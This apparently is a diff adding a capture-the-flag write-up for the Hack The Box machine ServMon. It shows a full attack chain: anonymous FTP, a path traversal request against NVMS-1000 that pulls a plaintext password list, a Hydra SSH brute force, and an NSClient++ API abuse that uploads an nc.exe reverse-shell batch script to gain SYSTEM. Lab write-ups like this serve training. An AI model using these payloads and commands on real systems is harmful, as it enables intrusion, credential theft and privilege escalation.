@@ -1,0 +1,343 @@
+try `Anonymous` ftp first 
+```
+zweilos@kalimaa:~/htb/servmon$ ftp 10.10.10.184
+Connected to 10.10.10.184.
+220 Microsoft FTP Service
+Name (10.10.10.184:zweilos): anonymous
+331 Anonymous access allowed, send identity (e-mail name) as password.
+Password:
+230 User logged in.
+Remote system type is Windows_NT.
+ftp> list
+?Invalid command
+ftp> dir
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+01-18-20  12:05PM       <DIR>          Users
+226 Transfer complete.
+ftp> cd users
+250 CWD command successful.
+ftp> dir
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+01-18-20  12:06PM       <DIR>          Nadine
+01-18-20  12:08PM       <DIR>          Nathan
+226 Transfer complete.
+ftp> cd nadine
+250 CWD command successful.
+ftp> dir
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+01-18-20  12:08PM                  174 Confidential.txt
+226 Transfer complete.
+ftp> get Confidential.txt
+local: Confidential.txt remote: Confidential.txt
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+226 Transfer complete.
+174 bytes received in 0.05 secs (3.6728 kB/s)
+ftp> cd ..
+250 CWD command successful.
+ftp> cd Nathan
+250 CWD command successful.
+ftp> dir
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+01-18-20  12:10PM                  186 Notes to do.txt
+226 Transfer complete.
+ftp> get "Notes to do.txt"
+local: Notes to do.txt remote: Notes to do.txt
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+226 Transfer complete.
+186 bytes received in 0.04 secs (4.1591 kB/s)
+ftp> 
+```
+```
+zweilos@kalimaa:~/htb/servmon$ cat 'Notes to do.txt'
+1) Change the password for NVMS - Complete
+2) Lock down the NSClient Access - Complete
+3) Upload the passwords
+4) Remove public access to NVMS
+5) Place the secret files in SharePoint
+```
+```
+zweilos@kalimaa:~/htb/servmon$ cat Confidential.txt 
+Nathan,
+
+I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.
+
+Regards
+
+Nadine
+```
+
+
+next port 80 - redirects to http://10.10.10.184/Pages/login.htm 
+"NVMS-1000" (pagetitle)
+quick search of searchsploit finds exploit for this web portal: https://www.exploit-db.com/exploits/47774
+https://www.rapid7.com/db/modules/auxiliary/scanner/http/tvt_nvms_traversal
+since we know the location of the `Passwords.txt` file, use this to exfiltrate
+
+did not work in url bar, but works in burp
+```
+GET /../../../../../../../../../../../../Users/Nathan/Desktop/Passwords.txt HTTP/1.1
+Host: 10.10.10.184
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: dataPort=6063; lang_type=0x0804%24zh-cn
+Upgrade-Insecure-Requests: 1
+DNT: 1
+```
+```
+HTTP/1.1 200 OK
+Content-type: text/plain
+Content-Length: 156
+Connection: close
+AuthInfo: 
+
+1nsp3ctTh3Way2Mars!
+Th3r34r3To0M4nyTrait0r5!
+B3WithM30r4ga1n5tMe
+L1k3B1gBut7s@W0rk
+0nly7h3y0unGWi11F0l10w
+IfH3s4b0Utg0t0H1sH0me
+Gr4etN3w5w17hMySk1Pa5$
+```
+now lets try to login to ssh as `Nathan` and `Nadine`. 
+```
+zweilos@kalimaa:~/htb/servmon$ hydra -l Nadine -P passwords 10.10.10.184 ssh
+Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-06-20 21:06:59
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 7 tasks per 1 server, overall 7 tasks, 7 login tries (l:1/p:7), ~1 try per task
+[DATA] attacking ssh://10.10.10.184:22/
+[22][ssh] host: 10.10.10.184   login: Nadine   password: L1k3B1gBut7s@W0rk
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-06-20 21:07:01
+```
+thanks `Nadine` for using the same password you recommended!
+
+```
+zweilos@kalimaa:~/htb/servmon$ ssh Nadine@10.10.10.184
+Nadine@10.10.10.184's password: 
+Microsoft Windows [Version 10.0.18363.752]
+(c) 2019 Microsoft Corporation. All rights reserved.
+
+nadine@SERVMON C:\Users\Nadine>whoami /all
+
+USER INFORMATION                                            
+----------------                                            
+                                                            
+User Name      SID                                          
+============== =============================================
+servmon\nadine S-1-5-21-3877449121-2587550681-992675040-1002
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                             Type             SID          Attributes
+
+====================================== ================ ============ ==================================
+================
+Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by defaul
+t, Enabled group
+BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by defaul
+t, Enabled group
+NT AUTHORITY\NETWORK                   Well-known group S-1-5-2      Mandatory group, Enabled by defaul
+t, Enabled group
+NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by defaul
+t, Enabled group
+NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by defaul
+t, Enabled group
+NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by defaul
+t, Enabled group
+NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by defaul
+t, Enabled group
+Mandatory Label\Medium Mandatory Level Label            S-1-16-8192
+
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                          State
+============================= ==================================== =======
+SeShutdownPrivilege           Shut down the system                 Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
+SeUndockPrivilege             Remove computer from docking station Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set       Enabled
+SeTimeZonePrivilege           Change the time zone                 Enabled
+
+
+nadine@SERVMON C:\Users\Nadine>
+```
+```
+nadine@SERVMON C:\Users\Nadine>cd Desktop
+
+nadine@SERVMON C:\Users\Nadine\Desktop>dir
+ Volume in drive C has no label.
+ Volume Serial Number is 728C-D22C
+
+ Directory of C:\Users\Nadine\Desktop
+
+21/06/2020  00:50    <DIR>          .
+21/06/2020  00:50    <DIR>          ..
+20/06/2020  23:33           566,851 PowerUp.ps1
+20/06/2020  18:33                34 user.txt
+20/06/2020  20:53            32,976 winPEAS.bat
+               3 File(s)        599,861 bytes
+               2 Dir(s)  27,815,362,560 bytes free
+
+nadine@SERVMON C:\Users\Nadine\Desktop>type user.txt
+0a58d2f4816893591068a81a719f5f08
+```
+C:\Users\Nadine\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+Nothing relevant...lots of attempts to do things from other users though!
+
+```
+nadine@SERVMON C:\Program Files\NSClient++>type changelog.txt
+2018-01-18 Michael Medin
+ * Fixed some Op5Client issues
+
+ 2018-01-15 Michael Medin
+ * Added hidden to check_tasksched to allow checking of hidden tasks
+ * Added tracing and fixed some issues to op5 client
+ * Fixed #525 json spirit should be an optional dependency (though a lot of things break without it)
+
+...snipped for brevity...
+```
+
+nadine@SERVMON C:\Program Files\NSClient++>nscp web -- password --display
+Current password: ew2x6SsGTxjRwXOT
+
+
+
+```bat
+#@echo off
+c:\Temp\nc.exe 10.10.14.15 4443 -e cmd.exe
+```
+When logging in, it was found that the login failed. After research, it was found that nsclient.ini would access the Web interface from the specified host. Only allow interface from local server (127.0.0.1):
+
+`ssh -L 8443:127.0.0.1:8443 Nadine@10.10.10.184`
+
+https://127.0.0.1:8443/index.html#/
+
+https://docs.nsclient.org/api/
+
+nadine@SERVMON C:\Users\Nadine>curl -k -u admin https://localhost:8443/api/v1
+Enter host password for user 'admin':
+curl: (7) Failed to connect to localhost port 8443: Connection refused
+
+nadine@SERVMON C:\Temp>curl -s -k -u admin -X PUT https://127.0.0.1:8443/api/v1/scripts/ext/scripts/evil.bat --data-binary "C:\Temp\nc.exe 10.10.15.20 12345 -e cmd.exe"
+Enter host password for user 'admin':
+Added evil as scripts\evil.bat
+
+nadine@SERVMON C:\Users\Nadine>curl -s -k -u admin https://127.0.0.1:8443/api/v1/queries/evil/commands/execute?time=5m
+```
+nadine@SERVMON C:\Temp>curl http://10.10.15.20:8090/nc.exe
+Warning: Binary output can mess up your terminal. Use "--output -" to tell
+Warning: curl to output it to your terminal anyway, or consider "--output
+Warning: <FILE>" to save to a file.
+
+nadine@SERVMON C:\Temp>curl http://10.10.15.20:8090/nc.exe --output nc.exe
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100 59392  100 59392    0     0  59392      0  0:00:01 --:--:--  0:00:01  264k
+
+nadine@SERVMON C:\Temp>dir
+ Volume in drive C has no label.
+ Volume Serial Number is 728C-D22C
+
+ Directory of C:\Temp
+
+21/06/2020  13:12    <DIR>          .
+21/06/2020  13:12    <DIR>          ..
+21/06/2020  13:12                 0 evil.bat
+21/06/2020  14:36            59,392 nc.exe
+               2 File(s)         59,392 bytes
+               2 Dir(s)  27,866,644,480 bytes free
+
+nadine@SERVMON C:\Temp>curl -s -k -u admin https://127.0.0.1:8443/api/v1/queries/evil/commands/execute?time=5m
+Enter host password for user 'admin':
+{"command":"evil","lines":[{"message":"Command evil didn't terminate within the timeout period 60s","pe
+rf":{}}],"result":3}
+```
+```
+zweilos@kalimaa:~$ nc -lvnp 12345
+listening on [any] 12345 ...
+connect to [10.10.15.20] from (UNKNOWN) [10.10.10.184] 49698
+Microsoft Windows [Version 10.0.18363.752]
+(c) 2019 Microsoft Corporation. All rights reserved.
+
+C:\Program Files\NSClient++>whoami /all
+whoami /all
+
+USER INFORMATION
+----------------
+
+User Name           SID     
+=================== ========
+nt authority\system S-1-5-18
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                             Type             SID          Attributes                                        
+====================================== ================ ============ ==================================================
+BUILTIN\Administrators                 Alias            S-1-5-32-544 Enabled by default, Enabled group, Group owner    
+Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+Mandatory Label\System Mandatory Level Label            S-1-16-16384                                                   
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                            Description                                                        State   
+========================================= ================================================================== ========
+SeAssignPrimaryTokenPrivilege             Replace a process level token                                      Disabled
+SeLockMemoryPrivilege                     Lock pages in memory                                               Enabled 
+SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
+SeTcbPrivilege                            Act as part of the operating system                                Enabled 
+SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
+SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
+SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
+SeSystemProfilePrivilege                  Profile system performance                                         Enabled 
+SeSystemtimePrivilege                     Change the system time                                             Disabled
+SeProfileSingleProcessPrivilege           Profile single process                                             Enabled 
+SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled 
+SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled 
+SeCreatePermanentPrivilege                Create permanent shared objects                                    Enabled 
+SeBackupPrivilege                         Back up files and directories                                      Disabled
+SeRestorePrivilege                        Restore files and directories                                      Disabled
+SeShutdownPrivilege                       Shut down the system                                               Disabled
+SeDebugPrivilege                          Debug programs                                                     Enabled 
+SeAuditPrivilege                          Generate security audits                                           Enabled 
+SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
+SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled 
+SeUndockPrivilege                         Remove computer from docking station                               Disabled
+SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled
+SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled 
+SeCreateGlobalPrivilege                   Create global objects                                              Enabled 
+SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled 
+SeTimeZonePrivilege                       Change the time zone                                               Enabled 
+SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled 
+SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled 
+
+ERROR: Unable to get user claims information.
+
+C:\Program Files\NSClient++>type C:/Users/Administrator/Desktop/root.txt
+type C:/Users/Administrator/Desktop/root.txt
+The syntax of the command is incorrect.
+
+C:\Program Files\NSClient++>type C:\Users\Administrator\Desktop\root.txt
+type C:\Users\Administrator\Desktop\root.txt
+410b71fc3946ddd7cb6c627f224d0d80
+```
